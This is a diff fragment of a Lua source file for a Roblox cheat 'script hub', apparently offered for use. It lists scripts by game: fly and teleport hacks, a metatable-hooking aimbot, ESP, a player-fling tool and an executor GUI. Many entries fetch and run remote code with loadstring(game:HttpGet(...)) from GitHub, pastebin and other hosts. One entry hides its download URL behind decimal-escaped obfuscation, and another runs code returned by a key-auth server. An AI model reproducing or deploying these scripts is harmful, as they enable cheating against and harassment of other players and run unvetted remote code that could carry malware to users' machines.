+				end
+			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+				speed = speed-1
+				if speed < 0 then
+					speed = 0
+				end
+			end
+			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+			else
+				bv.velocity = Vector3.new(0,0,0)
+			end
+
+			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+		end
+		ctrl = {f = 0, b = 0, l = 0, r = 0}
+		lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		speed = 0
+		bg:Destroy()
+		bv:Destroy()
+		plr.Character.Humanoid.PlatformStand = false
+		game.Players.LocalPlayer.Character.Animate.Disabled = false
+		tpwalking = false
+
+
+
+	end
+
+
+
+
+
+end)
+
+local tis
+
+up.MouseButton1Down:connect(function()
+	tis = up.MouseEnter:connect(function()
+		while tis do
+			wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
+		end
+	end)
+end)
+
+up.MouseLeave:connect(function()
+	if tis then
+		tis:Disconnect()
+		tis = nil
+	end
+end)
+
+local dis
+
+down.MouseButton1Down:connect(function()
+	dis = down.MouseEnter:connect(function()
+		while dis do
+			wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
+		end
+	end)
+end)
+
+down.MouseLeave:connect(function()
+	if dis then
+		dis:Disconnect()
+		dis = nil
+	end
+end)
+
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
+	wait(0.7)
+	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
+	game.Players.LocalPlayer.Character.Animate.Disabled = false
+
+end)
+
+
+plus.MouseButton1Down:connect(function()
+	speeds = speeds + 1
+	speed.Text = speeds
+	if nowe == true then
+
+
+		tpwalking = false
+		for i = 1, speeds do
+			spawn(function()
+
+				local hb = game:GetService("RunService").Heartbeat	
+
+
+				tpwalking = true
+				local chr = game.Players.LocalPlayer.Character
+				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+					if hum.MoveDirection.Magnitude > 0 then
+						chr:TranslateBy(hum.MoveDirection)
+					end
+				end
+
+			end)
+		end
+	end
+end)
+mine.MouseButton1Down:connect(function()
+	if speeds == 1 then
+		speed.Text = 'cannot be less than 1'
+		wait(1)
+		speed.Text = speeds
+	else
+		speeds = speeds - 1
+		speed.Text = speeds
+		if nowe == true then
+			tpwalking = false
+			for i = 1, speeds do
+				spawn(function()
+
+					local hb = game:GetService("RunService").Heartbeat	
+
+
+					tpwalking = true
+					local chr = game.Players.LocalPlayer.Character
+					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+						if hum.MoveDirection.Magnitude > 0 then
+							chr:TranslateBy(hum.MoveDirection)
+						end
+					end
+
+				end)
+			end
+		end
+	end
+end)
+
+closebutton.MouseButton1Click:Connect(function()
+	main:Destroy()
+end)
+
+mini.MouseButton1Click:Connect(function()
+	up.Visible = false
+	down.Visible = false
+	onof.Visible = false
+	plus.Visible = false
+	speed.Visible = false
+	mine.Visible = false
+	mini.Visible = false
+	mini2.Visible = true
+	main.Frame.BackgroundTransparency = 1
+	closebutton.Position =  UDim2.new(0, 0, -1, 57)
+end)
+
+mini2.MouseButton1Click:Connect(function()
+	up.Visible = true
+	down.Visible = true
+	onof.Visible = true
+	plus.Visible = true
+	speed.Visible = true
+	mine.Visible = true
+	mini.Visible = true
+	mini2.Visible = false
+	main.Frame.BackgroundTransparency = 0 
+	closebutton.Position =  UDim2.new(0, 0, -1, 27)
+end)
+]],
+		["ice hub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+]],
+		["Icehub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+]],
+		["infiny yield"] = [[defaultsettings = {
+	prefix = ';';
+	StayOpen = false;
+	keepIY = true;
+	logsEnabled = false;
+	jLogsEnabled = false;
+	aliases = {};
+	binds = {};
+	WayPoints = {};
+	PluginsTable = {};
+}
+
+defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)
+
+writefile("IY_FE.iy",defaults)
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+]],
+		["kill all Troll"] = [[ loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\99\117\114\97\88\48\52\57\47\111\98\102\117\115\99\97\116\101\100\83\99\114\105\112\116\115\47\109\97\105\110\47\75\105\108\108\71\117\105\34\41\41\40\41\10")() 
+]],
+		["Metab"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/NocturneMoDz/BROOKHAVEN-GUI-/main/METAB", true))()]]
+	},
+
+	lumber_tycoon_2 = {
+		["Butter GUI"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/Butterhub.txt'))()]]
+	},
+
+	kat = {
+		["Aimbot (Closest Player)"] = [[local Camera = game:GetService("Workspace").CurrentCamera
+local Players = game:GetService("Players")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local function GetClosestPlayer()
+   local ClosestPlayer = nil
+   local FarthestDistance = math.huge
+
+   for i, v in pairs(Players.GetPlayers(Players)) do
+       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
+           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude
+
+           if DistanceFromPlayer < FarthestDistance then
+               FarthestDistance = DistanceFromPlayer
+               ClosestPlayer = v
+           end
+       end
+   end
+
+   if ClosestPlayer then
+       return ClosestPlayer
+   end
+end
+
+local GameMetaTable = getrawmetatable(game)
+local OldGameMetaTableNamecall = GameMetaTable.__namecall
+setreadonly(GameMetaTable, false)
+
+GameMetaTable.__namecall = newcclosure(function(object, ...)
+   local NamecallMethod = getnamecallmethod()
+   local Arguments = {...}
+
+   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
+       local ClosestPlayer = GetClosestPlayer()
+       
+       if ClosestPlayer and ClosestPlayer.Character then
+           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
+       end
+   end
+
+   return OldGameMetaTableNamecall(object, unpack(Arguments))
+end)
+
+setreadonly(GameMetaTable, true)]],
+
+		["Unamed gui"] = [[if game.PlaceId == 621129760 then
+		
+loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
+ 
+-- Gui to Lua
+-- Version: 3.2
+ 
+-- Instances:
+ 
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+ 
+--Properties:
+ 
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ 
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BackgroundTransparency = 0.300
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderSizePixel = 5
+Frame.Position = UDim2.new(0, 0, 0.5, -62)
+Frame.Size = UDim2.new(0, 702, 0, 124)
+Frame.Active = true
+ 
+ 
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 3.000
+TextLabel.Size = UDim2.new(0, 702, 0, 124)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "This GUI is not the best with Every exploit. It's mainly for paid exploits, such as Script ware and Synapse, If you dont have a paid exploit, then I Suggest You Use Krnl Or Fluxus, Press L To Toggle The UI. I recommend having at least laser when using silent aim with a knife, incase you dont have try out spam knife!"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+ 
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 3.000
+TextButton.Position = UDim2.new(0.928774953, 0, 0.669354856, 0)
+TextButton.Size = UDim2.new(0, 42, 0, 41)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Close"
+TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 50.000
+TextButton.TextWrapped = true
+TextButton.MouseButton1Down:connect(function()
+    Frame.Visible = false
+end)
+ 
+end]]
+
+	},
+
+	murder_mystery_2 = {
+		["Admin panel"] = [[loadstring(game:HttpGet('https://pastebin.com/raw/DihfjHj2'))()]],
+		["Another Unamed GUI"] = [[loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/16d946bfe0a0ed98a8e32de362fd4217/raw/0681fa979da042841f4e71a52490fdc3a2a16376/cac", true))()]],
+		["Brizzyware autofarm"] = [[loadstring(game:HttpGet('https://scripts.luawl.com/13752/mm2farm.lua'))()]],
+		["Eclipse Hub"] = [[getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()]],
+		["ESP (R is toggle key)"] = [[if getgenv().espscript == true then return error("Script already executed") end
+
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+getgenv().espscript = true
+getgenv().espenabled = true
+
+local function SendNotification(title, text)
+    StarterGui:SetCore("SendNotification", {Title = tostring(title), Text = tostring(text)})
+end
+
+local function getRoleColor(plr)
+	if plr.Backpack:FindFirstChild("Knife") or plr.Character:FindFirstChild("Knife") then
+		return Color3.new(255, 0, 0)
+	elseif plr.Backpack:FindFirstChild("Gun") or plr.Character:FindFirstChild("Gun") then
+		return Color3.new(0, 0, 255)
+	else
+		return Color3.new(0, 255, 0)
+	end
+end
+
+UserInputService.InputBegan:Connect(function(input)
+    if UserInputService:GetFocusedTextBox() ~= nil then return end
+
+    if input.KeyCode == Enum.KeyCode.R then
+        if getgenv().espenabled == true then
+            getgenv().espenabled = false
+            SendNotification("ESP", "ESP has been disabled.")
+        elseif getgenv().espenabled == false then
+            getgenv().espenabled = true
+            SendNotification("ESP", "ESP has been enabled.")
+        end
+    end
+end)
+
+while wait() do
+	for _, v in pairs(game.Players:GetChildren()) do
+		if v ~= game.Players.LocalPlayer and v.Character and (not v.Character:FindFirstChild("Highlight")) then
+            Instance.new("Highlight", v.Character)
+            v.Character.Highlight.FillTransparency = 0.5
+            v.Character.Highlight.OutlineTransparency = 0.5
+            v.Character.Highlight.FillColor = getRoleColor(v)
+		elseif v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Highlight") then
+			v.Character.Highlight.FillColor = getRoleColor(v)
+            if getgenv().espenabled == true then
+                v.Character.Highlight.Enabled = true
+            elseif getgenv().espenabled == false then
+                v.Character.Highlight.Enabled = false
+            end
+		end
+	end
+end]],
+		["Fling"] = [[local lp = game:FindService("Players").LocalPlayer
+
+local function gplr(String)
+    local Found = {}
+    local strl = String:lower()
+    if strl == "all" then
+        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+            table.insert(Found,v)
+        end
+    elseif strl == "others" then
+        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+            if v.Name ~= lp.Name then
+                table.insert(Found,v)
+            end
+        end 
+    elseif strl == "me" then
+        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+            if v.Name == lp.Name then
+                table.insert(Found,v)
+            end
+        end 
+    else
+        for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+            if v.Name:lower():sub(1, #String) == String:lower() then
+                table.insert(Found,v)
+            end
+        end 
+    end
+    return Found 
+end
+
+local function notif(str,dur)
+    game:FindService("StarterGui"):SetCore("SendNotification", {
+        Title = "yeet gui",
+        Text = str,
+        Icon = "rbxassetid://2005276185",
+        Duration = dur or 3
+    })
+end
+
+--// sds
+
+local h = Instance.new("ScreenGui")
+local Main = Instance.new("ImageLabel")
+local Top = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+
+h.Name = "h"
+h.Parent = game:GetService("CoreGui")
+h.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = h
+Main.Active = true
+Main.Draggable = true
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
+Main.Size = UDim2.new(0, 454, 0, 218)
+Main.Image = "rbxassetid://2005276185"
+
+Top.Name = "Top"
+Top.Parent = Main
+Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+Top.BorderSizePixel = 0
+Top.Size = UDim2.new(0, 454, 0, 44)
+
+Title.Name = "Title"
+Title.Parent = Top
+Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0, 0, 0.295454562, 0)
+Title.Size = UDim2.new(0, 454, 0, 30)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "FE Yeet Gui (trollface edition)"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+TextBox.Parent = Main
+TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
+TextBox.Size = UDim2.new(0, 388, 0, 62)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Who do i destroy(can be shortened)"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Main
+TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
+TextButton.Size = UDim2.new(0, 359, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Cheese em'"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton.MouseButton1Click:Connect(function()
+    local Target = gplr(TextBox.Text)
+    if Target[1] then
+        Target = Target[1]
+
+        local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+        Thrust.Force = Vector3.new(9999,9999,9999)
+        Thrust.Name = "YeetForce"
+        repeat
+            lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+            Thrust.Location = Target.Character.HumanoidRootPart.Position
+            game:FindService("RunService").Heartbeat:wait()
+        until not Target.Character:FindFirstChild("Head")
+    else
+        notif("Invalid player")
+    end
+end)
+
+--//fsddfsdf
+notif("Loaded successfully! Created by scuba#0001", 5)]],
+		["Unamed GUI"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/murder2/main/Protected%20(9).lua"))()]],
+		["Vynixu"] = [[loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()]],
+	}
+
+}
+
+if not Rs:FindFirstChild("ChimeraLle's Hub") then
+
+	local Fol555 = Instance.new("Folder",Rs)
+	Fol555.Name = "ChimeraLle's Hub"
+
 	local ScreenGui = Instance.new("ScreenGui")
 	local ImageLabel = Instance.new("ImageLabel")
-	local UICorner = Instance.new("UICorner")
-	local UIStroke = Instance.new("UIStroke")
 	local Buttons = Instance.new("Frame")
+	local Executor = Instance.new("ImageButton")
+	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+	local UIGridLayout = Instance.new("UIGridLayout")
+	local Search = Instance.new("ImageButton")
+	local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
+	local Settings = Instance.new("ImageButton")
+	local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
+	local UICorner = Instance.new("UICorner")
+	local Pages = Instance.new("Frame")
+	local Executor_2 = Instance.new("Frame")
+	local Size = Instance.new("ScrollingFrame")
+	local PlayerScript = Instance.new("TextBox")
+	local TextLabel_5 = Instance.new("TextLabel")
+	local ScriptLine = Instance.new("TextBox")
+	local Buttons_2 = Instance.new("Frame")
+	local UIGridLayout_2 = Instance.new("UIGridLayout")
+	local Search_2 = Instance.new("TextButton")
+	local UICorner_2 = Instance.new("UICorner")
+	local UIStroke = Instance.new("UIStroke")
+	local Execute = Instance.new("TextButton")
+	local UICorner_3 = Instance.new("UICorner")
+	local Clear = Instance.new("TextButton")
+	local UICorner_4 = Instance.new("UICorner")
+	local Search_3 = Instance.new("Frame")
+	local Size_2 = Instance.new("ScrollingFrame")
+	local GameScript = Instance.new("TextButton")
+	local Name = Instance.new("TextLabel")
+	local UIPadding_3 = Instance.new("UIPadding")
+	local Image = Instance.new("ImageLabel")
+	local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
+	local UICorner_5 = Instance.new("UICorner")
+	local UICorner_6 = Instance.new("UICorner")
+	local UIGridLayout_3 = Instance.new("UIGridLayout")
+	local Settings_2 = Instance.new("Frame")
+	local Size_3 = Instance.new("ScrollingFrame")
 	local UIListLayout = Instance.new("UIListLayout")
-	local Execute = Instance.new("ImageLabel")
-	local Execute_2 = Instance.new("TextButton")
+	local Number = Instance.new("Frame")
+	local TextLabel = Instance.new("TextLabel")
 	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
-	local Clear = Instance.new("ImageLabel")
-	local Clear_2 = Instance.new("TextButton")
+	local TextBox = Instance.new("TextBox")
+	local UICorner_7 = Instance.new("UICorner")
 	local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
-	local Text = Instance.new("ScrollingFrame")
-	local Text_2 = Instance.new("TextBox")
-	local UIPadding = Instance.new("UIPadding")
-	
-	ScreenGui.Parent = game.CoreGui
-	ScreenGui.Enabled = true
+	local UICorner_8 = Instance.new("UICorner")
+	local Key = Instance.new("Frame")
+	local TextLabel_2 = Instance.new("TextLabel")
+	local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
+	local TextBox_2 = Instance.new("TextBox")
+	local UICorner_9 = Instance.new("UICorner")
+	local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
+	local UICorner_10 = Instance.new("UICorner")
+	local Key2 = Instance.new("Frame")
+	local TextLabel_3 = Instance.new("TextLabel")
+	local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
+	local TextBox_3 = Instance.new("TextBox")
+	local UICorner_11 = Instance.new("UICorner")
+	local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
+	local UICorner_12 = Instance.new("UICorner")
+	local Key3 = Instance.new("Frame")
+	local TextLabel_4 = Instance.new("TextLabel")
+	local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
+	local TextBox_4 = Instance.new("TextBox")
+	local UICorner_13 = Instance.new("UICorner")
+	local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")
+	local UICorner_14 = Instance.new("UICorner")
+	local UICorner_15 = Instance.new("UICorner")
+
+	-- Properties
+
+	ScreenGui.Parent = CoreGui
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 	ScreenGui.ResetOnSpawn = false
 
 	ImageLabel.Parent = ScreenGui
-	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+	ImageLabel.BorderColor3 = Color3.new(0, 0, 0)
 	ImageLabel.BorderSizePixel = 0
-	ImageLabel.Position = UDim2.new(0.25, 0, -1.25, 0)
-	ImageLabel.Size = UDim2.new(0.5, 0, 0.5, 0)
-	ImageLabel.Image = "rbxassetid://8522759290"
-
-	UICorner.CornerRadius = UDim.new(0, 20)
-	UICorner.Parent = ImageLabel
-
-	UIStroke.Parent = ImageLabel
-	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-	UIStroke.Color = Color3.fromRGB(18,78,137)
-	UIStroke.LineJoinMode = Enum.LineJoinMode.Round
-	UIStroke.Thickness = 5
-	UIStroke.Transparency = 0
+	ImageLabel.Position = UDim2.new(0.200000003, 0, -1, 0)
+	ImageLabel.Size = UDim2.new(0.600000024, 0, 0.5, 0)
+	ImageLabel.Image = "rbxassetid://10980958752"
+	ImageLabel.ScaleType = Enum.ScaleType.Crop
 
 	Buttons.Name = "Buttons"
 	Buttons.Parent = ImageLabel
-	Buttons.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	Buttons.BackgroundTransparency = 1.000
-	Buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Buttons.BackgroundColor3 = Color3.new(0, 0, 0)
+	Buttons.BackgroundTransparency = 0.800000011920929
+	Buttons.BorderColor3 = Color3.new(0, 0, 0)
 	Buttons.BorderSizePixel = 0
-	Buttons.Position = UDim2.new(0, 0, 0.800000012, 0)
-	Buttons.Size = UDim2.new(1, 0, 0.200000003, 0)
+	Buttons.Size = UDim2.new(0.150000006, 0, 1, 0)
 
-	UIListLayout.Parent = Buttons
-	UIListLayout.FillDirection = Enum.FillDirection.Horizontal
-	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-	UIListLayout.Padding = UDim.new(0.0199999996, 0)
+	Executor.Name = "Executor"
+	Executor.Parent = Buttons
+	Executor.BackgroundColor3 = Color3.new(1, 1, 1)
+	Executor.BackgroundTransparency = 1
+	Executor.BorderColor3 = Color3.new(0, 0, 0)
+	Executor.BorderSizePixel = 0
+	Executor.Size = UDim2.new(1, 0, 0.300000012, 0)
+	Executor.Image = "rbxassetid://13866917357"
+	Executor.ImageColor3 = Color3.new(0.588235, 0.588235, 0.588235)
+	Executor.ScaleType = Enum.ScaleType.Fit
+	Executor.SliceCenter = Rect.new(48, 48, 48, 48)
+	Executor.TileSize = UDim2.new(0.5, 0, 0.5, 0)
+
+	UIAspectRatioConstraint.Parent = Executor
+
+	UIGridLayout.Parent = Buttons
+	UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+	UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 20)
+	UIGridLayout.CellSize = UDim2.new(0.800000012, 0, 0.200000003, 0)
+
+	Search.Name = "Search"
+	Search.Parent = Buttons
+	Search.BackgroundColor3 = Color3.new(1, 1, 1)
+	Search.BackgroundTransparency = 1
+	Search.BorderColor3 = Color3.new(0, 0, 0)
+	Search.BorderSizePixel = 0
+	Search.Size = UDim2.new(1, 0, 0.300000012, 0)
+	Search.Image = "rbxassetid://11496279085"
+	Search.ImageColor3 = Color3.new(0.588235, 0.588235, 0.588235)
+	Search.ScaleType = Enum.ScaleType.Slice
+
+	UIAspectRatioConstraint_2.Parent = Search
+
+	Settings.Name = "Settings"
+	Settings.Parent = Buttons
+	Settings.BackgroundColor3 = Color3.new(1, 1, 1)
+	Settings.BackgroundTransparency = 1
+	Settings.BorderColor3 = Color3.new(0, 0, 0)
+	Settings.BorderSizePixel = 0
+	Settings.Size = UDim2.new(1, 0, 0.300000012, 0)
+	Settings.Image = "rbxassetid://11932591062"
+	Settings.ImageColor3 = Color3.new(0.588235, 0.588235, 0.588235)
+	Settings.ScaleType = Enum.ScaleType.Slice
+
+	UIAspectRatioConstraint_3.Parent = Settings
+
+	UICorner.Parent = Buttons
+
+	Pages.Name = "Pages"
+	Pages.Parent = ImageLabel
+	Pages.BackgroundColor3 = Color3.new(1, 1, 1)
+	Pages.BackgroundTransparency = 1
+	Pages.BorderColor3 = Color3.new(0, 0, 0)
+	Pages.BorderSizePixel = 0
+	Pages.Position = UDim2.new(0.150000006, 0, 0, 0)
+	Pages.Size = UDim2.new(0.850000024, 0, 1, 0)
+
+	Executor_2.Name = "Executor"
+	Executor_2.Parent = Pages
+	Executor_2.BackgroundColor3 = Color3.new(0, 0, 0)
+	Executor_2.BackgroundTransparency = 1
+	Executor_2.BorderColor3 = Color3.new(0, 0, 0)
+	Executor_2.BorderSizePixel = 0
+	Executor_2.Size = UDim2.new(1, 0, 1, 0)
+
+	Size.Name = "Size"
+	Size.Parent = Executor_2
+	Size.Active = true
+	Size.BackgroundColor3 = Color3.new(0, 0, 0)
+	Size.BackgroundTransparency = 1
+	Size.BorderColor3 = Color3.new(0, 0, 0)
+	Size.BorderSizePixel = 0
+	Size.Size = UDim2.new(1, 0, 0.800000012, 0)
+	Size.CanvasSize = UDim2.new(0, 0, 0, 0)
+	Size.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+	PlayerScript.Name = "PlayerScript"
+	PlayerScript.Parent = Size
+	PlayerScript.BackgroundColor3 = Color3.new(1, 1, 1)
+	PlayerScript.BackgroundTransparency = 1
+	PlayerScript.BorderColor3 = Color3.new(0, 0, 0)
+	PlayerScript.BorderSizePixel = 0
+	PlayerScript.Position = UDim2.new(0.100000001, 0, 0, 0)
+	PlayerScript.Size = UDim2.new(0.899999976, 0, 1, 0)
+	PlayerScript.ClearTextOnFocus = false
+	PlayerScript.Font = Enum.Font.Cartoon
+	PlayerScript.MultiLine = true
+	PlayerScript.PlaceholderText = ">"
+	PlayerScript.Text = "print(\"Hello world!\")"
+	PlayerScript.TextColor3 = Color3.new(0.5,0.5,0.5)
+	PlayerScript.TextSize = 25
+	PlayerScript.TextWrapped = false
+	PlayerScript.TextXAlignment = Enum.TextXAlignment.Left
+	PlayerScript.TextYAlignment = Enum.TextYAlignment.Top
+	PlayerScript.AutomaticSize = Enum.AutomaticSize.Y
+
+	TextLabel_5.Parent = PlayerScript
+	TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
+	TextLabel_5.BackgroundTransparency = 1
+	TextLabel_5.BorderColor3 = Color3.new(0, 0, 0)
+	TextLabel_5.BorderSizePixel = 0
+	TextLabel_5.Size = UDim2.new(1, 0, 1, 0)
+	TextLabel_5.Font = Enum.Font.Cartoon
+	TextLabel_5.Text = PlayerScript.Text
+	TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
+	TextLabel_5.TextScaled = false
+	TextLabel_5.TextSize = 25
+	TextLabel_5.TextWrapped = false
+	TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
+	TextLabel_5.TextYAlignment = Enum.TextYAlignment.Top
+
+	ScriptLine.Name = "ScriptLine"
+	ScriptLine.Parent = Size
+	ScriptLine.BackgroundColor3 = Color3.new(0, 0, 0)
+	ScriptLine.BackgroundTransparency = 1
+	ScriptLine.BorderColor3 = Color3.new(0, 0, 0)
+	ScriptLine.BorderSizePixel = 0
+	ScriptLine.Size = UDim2.new(0.100000001, 0, 1, 0)
+	ScriptLine.ClearTextOnFocus = false
+	ScriptLine.Font = Enum.Font.Cartoon
+	ScriptLine.MultiLine = true
+	ScriptLine.PlaceholderColor3 = Color3.new(1, 1, 1)
+	ScriptLine.PlaceholderText = "1"
+	ScriptLine.Text = ""
+	ScriptLine.TextColor3 = Color3.new(1, 1, 1)
+	ScriptLine.TextSize = 25
+	ScriptLine.TextYAlignment = Enum.TextYAlignment.Top
+	ScriptLine.AutomaticSize = Enum.AutomaticSize.Y
+
+	Buttons_2.Name = "Buttons"
+	Buttons_2.Parent = Executor_2
+	Buttons_2.BackgroundColor3 = Color3.new(1, 1, 1)
+	Buttons_2.BackgroundTransparency = 1
+	Buttons_2.BorderColor3 = Color3.new(0, 0, 0)
+	Buttons_2.BorderSizePixel = 0
+	Buttons_2.Position = UDim2.new(0, 0, 0.800000012, 0)
+	Buttons_2.Size = UDim2.new(1, 0, 0.200000003, 0)
+
+	UIGridLayout_2.Parent = Buttons_2
+	UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
